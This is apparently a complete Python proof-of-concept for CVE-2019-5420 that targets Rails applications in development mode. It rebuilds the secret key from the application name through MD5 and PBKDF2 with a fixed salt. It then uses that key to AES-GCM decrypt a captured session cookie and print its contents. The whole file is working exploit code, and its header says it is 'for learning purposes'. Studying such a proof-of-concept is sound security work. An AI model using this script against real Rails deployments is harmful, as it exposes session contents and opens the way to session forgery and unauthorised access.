#!/usr/bin/env python3
#CVE-2019-5420 POC for learning purposes
#Affects rails apps in development mode.
#Affected versions: <5.2.2.1, <6.0.0.beta3
#Anas Taoutaou


import hashlib
import urllib.parse
import base64
from Crypto.Cipher import AES


application_name = b"APP-NAME-HERE::Application"  #REPLACE APPNAME HERE

cookie = urllib.parse.unquote(b"COOKIE-HERE")     #REPLACE COOKIE HERE
cookie_split  = cookie.split('--')

data = base64.b64decode(cookie_split[0])
iv = base64.b64decode(cookie_split[1])
authtag = base64.b64decode(cookie_split[2])

key = hashlib.pbkdf2_hmac('sha1',hashlib.md5(application_name).hexdigest().encode('utf-8'),b'authenticated encrypted cookie',1000,32)

cipher = AES.new(key, AES.MODE_GCM, nonce=iv)

decrypted_data = cipher.decrypt_and_verify(data, authtag)


print(f"[!] Decrypted cookie contents: {decrypted_data}")
